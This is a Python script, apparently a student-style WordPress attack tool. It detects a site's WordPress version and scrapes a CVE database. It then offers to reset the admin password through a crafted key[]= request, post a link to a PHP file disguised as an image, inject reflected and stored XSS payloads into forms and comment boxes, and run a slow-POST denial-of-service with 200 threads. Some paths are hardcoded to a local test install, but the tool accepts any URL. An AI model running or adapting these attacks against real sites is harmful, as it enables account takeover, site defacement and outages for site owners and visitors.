import urllib, re, sys
import selenium.common
from urllib.request import urlopen
from urllib.error import URLError, HTTPError
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.common.exceptions import TimeoutException
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.support import expected_conditions as EC
from time import sleep
import socket
import threading

def openConnections(url, threads, sleepTime) :
    urlParts = urllib.parse.urlparse(url)
    if (urlParts.scheme != 'http'):
        raise Exception('Only the http protocol is currently supported')

    port = urlParts.port

    if port == None: port = 80

    print ("Opening %d sockets to %s:%d" % (threads, urlParts.hostname, port))

    pool = []
    try:
        for i in range(1, threads):
            t = Worker(urlParts.hostname, port, urlParts.path, sleepTime)
            pool.append(t)
            t.start()

        print ("Started %d threads. Hit ctrl-c to exit" % (threads))
        
        try:
            req = urllib.request.Request(url)
            htmltext = urlopen(req, timeout=10)
        except socket.timeout as e:
            print("Server is allowing to DOS")
            for worker in pool: worker.stop()

            for worker in pool: worker.join()         

    except KeyboardInterrupt as e:
        print ("\nCaught keyboard interrupt. Stopping all threads")

        for worker in pool: worker.stop()

        for worker in pool: worker.join()

class Worker (threading.Thread):
    def __init__(self, host, port, path, sleepTime) :
        self.host = host
        self.port = port
        self.path = path
        self.sleepTime = sleepTime
        self.stopped = False
        threading.Thread.__init__(self)

    def stop(self): self.stopped = True

    def run(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.host, self.port))
        s.settimeout(1)
        strin = "POST " + self.path +  "HTTP/1.1\r\n "+ "Host: " + self.host + "\r\n" +"Connection: close\r\n" +"Content-Length: 1000000\r\n" +"\r\n"
        s.send(strin.encode('UTF-8'))

        while not self.stopped:
            s.send('abc=123&'.encode('UTF-8'))
            sleep(self.sleepTime/1000) 

        s.close
        
def Check_URL (url):
    #Парсим адрес и если в начале отсутствует http:// , то добавляем его
    parsedUrl = urllib.parse.urlparse(url)
    scheme = parsedUrl.scheme.lower()
    netloc=parsedUrl.netloc

    if not scheme:
        if not netloc:
            url="http://"+url
        else:
            url="http://"+netloc
    return url

def Check_WP_and_search_version (url):
    

    agent = 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7'
    headers = {}
    headers['User-Agent'] = agent
    print("Make sure is it WordPress.")
   
    #Проверяем, является ли эта CMS Wordpress-ом
    req = urllib.request.Request(url+"/wp-config.php")
    try:
        htmltext = urlopen(req, timeout=3).read()
        len_htmltext=len(str(htmltext))
        if len_htmltext >= 3:
            print("This is wordpress.")
        else:
            print("This is not wordptess.")
            sys.exit()
    except (HTTPError) as e:
        if e.code == 403:
            print("This is wordpress.")
        else:
            print("This is not wordpress.")
            sys.exit()
    except (URLError) as e:
            print("Time out. Probably this is not Wordpress")
            sys.exit()
    #Определяем версию ворд пресса
    print("Recognizing version. Please wait...")
    version=[]
    try:
        req = urllib.request.Request(url+"/readme.html", headers=headers)
        htmltext = urlopen(req, timeout=5).read()
        regex= '.*wordpress-logo.png" /></a>.*<br />.* (\d+\.\d+[\.\d+]*).{2}</h1>'
        #patt = re.compile(regex)
        version = re.findall(regex,str(htmltext))
        if version==[]:
            print("Can't find version using readme.html")
        else:
            print("Wordpress Version: "+version[0])     
            return version[0]          
    except (urllib.error.HTTPError, IndexError and URLError) as e:
        print("Can't find version using readme.html")
    try:
        req = urllib.request.Request(url, headers=headers)
        htmltext = urlopen(req).read()
        version = re.findall('<meta name="generator" content="WordPress (\d+\.\d+[\.\d+]*)"', str(htmltext))
        if version==[]:
            print("Can't find version using HTML code of page.")
            sys.exit()
        else:
            print("But finded by HTML code. Wordpress Version: "+version[0])
            return version[0] 
    except (urllib.error.HTTPError, IndexError) as e:
        print("Can't find version using HTML code of page.")
        sys.exit()

def Search_vulnerabilities (version):
        driver = webdriver.Firefox()
        driver.get("http://www.cvedetails.com/version-search.php")
        try:       
            elem= driver.find_element_by_xpath("//input[@name='product']") 
            elem.send_keys("Wordpress")
            elem=driver.find_element_by_xpath("//input[@name='version']")
            elem.send_keys(version)
            elem.send_keys(Keys.RETURN)
        except selenium.common.exceptions.NoSuchElementException:
            print("Perhaps you have some problems with the Internet.")
            sys.exit()
        try:  
            driver.find_element_by_xpath("//td[@class='errormsg']")
            print("No matches for such version.")
            driver.quit()
            return 0
        except selenium.common.exceptions.NoSuchElementException:
                pass

        try:
            continue_link=driver.find_element_by_link_text("Vulnerabilities")
            continue_link=continue_link.get_attribute("href")
            driver.get(continue_link)
            print("Please wait...")
        except selenium.common.exceptions.NoSuchElementException:
            print("Please wait...")
            
        types_of_vulnerabilities=[]
        count=1
        while True:
            try:
                i=str(count*2)
                el=driver.find_element_by_xpath("//table[@id='vulnslisttable']//tr["+i+"]/td[5]")
                types_of_vulnerabilities.append(el.text)
                count=count+1
            except selenium.common.exceptions.NoSuchElementException:
                break

        information_about_vulnerability=[]
        for x in range(1,count,1):
            i=str(x*2+1)
            el=driver.find_element_by_xpath("//table[@id='vulnslisttable']//tr["+i+"]/td[1]")
            information_about_vulnerability.append(el.text)
        file=open("List of vulnerabilities.txt","w")
        file.write("Vulnerabilities of Wordpress version "+version+":\n")
        for x in range(count-1):
            file.write("Type of vulnerability "+types_of_vulnerabilities[x]+".\n")
            file.write("Information:\n")
            file.write(information_about_vulnerability[x]+"\n")
        file.close()
        driver.quit()  
        print("It's done. Vulnerabilities, which were found, are lists in List of vulnerabilities.txt")
        
def Type_Expl():
    Typed = False
    try:
        elem = driver.find_element_by_link_text("Exploited!")
        elem.click()
        WebDriverWait(driver, 3).until(EC.alert_is_present())
        alert = driver.switch_to_alert()
        print("XSS is allowed!")
        return(True)
    except (TimeoutException, NoSuchElementException):
        try:
            author = driver.find_element_by_name("author")
            author.send_keys("Nagibator")
            email = driver.find_element_by_name("email")
            email.send_keys("Nagibator@gmail.com")
            commentbox = driver.find_element_by_id("comment")
            commentbox.send_keys("[a <a href=']'></a><a href=' onmouseover=alert(1) '>Exploited!</a>")
            commentbox.submit()
            Typed = True
            elem = driver.find_element_by_link_text("Exploited!")
            elem.click()
            WebDriverWait(driver, 3).until(EC.alert_is_present())
            alert = driver.switch_to_alert()
            print("XSS is allowed!")
            return(True)
        except (NoSuchElementException, TimeoutException):
            if Typed == True:
                print("XSS was typed, but there is comment administration. So we havn't proof of XSS vulnerability")
                return(True)
            return(False)

def Reflected_Xss_for_232(url):
    driver=webdriver.Firefox()
    driver.get(url)
    try:
        element=driver.find_element_by_xpath("//input[@type='text']")
        element.send_keys('<script>alert("Hello!")</script>')
        element.send_keys(Keys.RETURN)
        alert=driver.switch_to_alert()
        print(alert.text)
        print("Xss is success. Press Enter to continue.\n")
        try:
            alert.accept()
        except selenium.common.exceptions.NoAlertPresentException:
            pass
    except:
        print("Xss is failed.")
    finally:
        driver.quit()
      
def Upload_PHP_code(url):
    driver=webdriver.Firefox()
    driver.get(url+"/wp-admin/post-new.php")
    try:
        element=driver.find_element_by_id("user_login")
        element.send_keys("user1")
        element=driver.find_element_by_id("user_pass")
        element.send_keys("123456")
        element.send_keys(Keys.RETURN)
        while True:
            try:
                element=driver.find_element_by_name("content")
                element.send_keys('<a href="http://127.0.0.1/wordpress28/wp-content/uploads/2015/05/test-imadge.php.jpg"> Picture</a>')
                break
            except:
                pass
        element=driver.find_element_by_id("publish")
        element.send_keys(Keys.ENTER)
        print("PHP code succesfully uploaded.")
    except:
        print("Uploading PHP code failed.")
    finally:
        driver.quit()      
        
url=input("Enter URL(e.g. 127.0.0.1/wordpress or example.com):\n")
url=Check_URL(url)
version=Check_WP_and_search_version(url)
Search_vulnerabilities(version)
version=version.split(".")
if(len(version)<3):
    version.append(0)
    
version=int(version[0])+int(version[1])/10+int(version[2])/100
if (version <= 2.83):
    y="y"
    n="n"
    while(True):
        try:
            answer = input("Would you like reset admin password? y/n\n")
            if(answer == "y"):
                urlopen("http://127.0.0.1/wordpress28/wp-login.php?action=rp&key[]=")
                break
            if(answer == "n"):
                break
        except NameError as e:
            print("Incorrect answer, please try again")
    while(True):
        try:
            answer = input("Would you like to try upload PHP code on server? y/n\n")
            if(answer == "y"):
                Upload_PHP_code(url)
                break
            if(answer == "n"):
                break
        except NameError as e:
            print("Incorrect answer, please try again")
    if(version<=2.32):
        while(True):
            try:
                answer = input("Would you like to try reflected xss? y/n\n")
                if(answer == "y"):
                    Reflected_Xss_for_232(url)
                    break
                if(answer == "n"):
                    break
            except NameError as e:
                print("Incorrenct answer, please try again")
if((version >3)and(version<4)):
    print("Testing stored xss attack vulnerability")
    success = False
    print("Please wait...")
    driver = webdriver.Firefox()
    driver.get(url)
    list_links = driver.find_elements_by_tag_name("a")
    list = []
    for item in list_links:
        if (item.get_attribute('href') not in list and item.get_attribute('href') != "http://wordpress.org/" and item.get_attribute('href') != "http://ru.wordpress.org/"):
            list.append(item.get_attribute('href'))
    for p in list:
        driver.get(p)
        success = Type_Expl()
        if success == True:
            driver.quit()
            break
        try:
            link = driver.find_element_by_partial_link_text("omment")
            link.click()
            success = Type_Expl()
            if success == True:
                driver.quit()
                break
        except NoSuchElementException:
            try:
                link = driver.find_element_by_partial_link_text("оммента")
                link.click()
                success = Type_Expl()
                if success == True:
                    driver.quit()
                    break
            except NoSuchElementException:
                continue

while(True):
        try:
            answer = input("Would you like to DOS this server? y/n\n")
            if(answer == "y"):
                openConnections(url, 200, 1000)
                break
            if(answer == "n"):
                break
        except NameError as e:
            print("Incorrect answer, please try again")
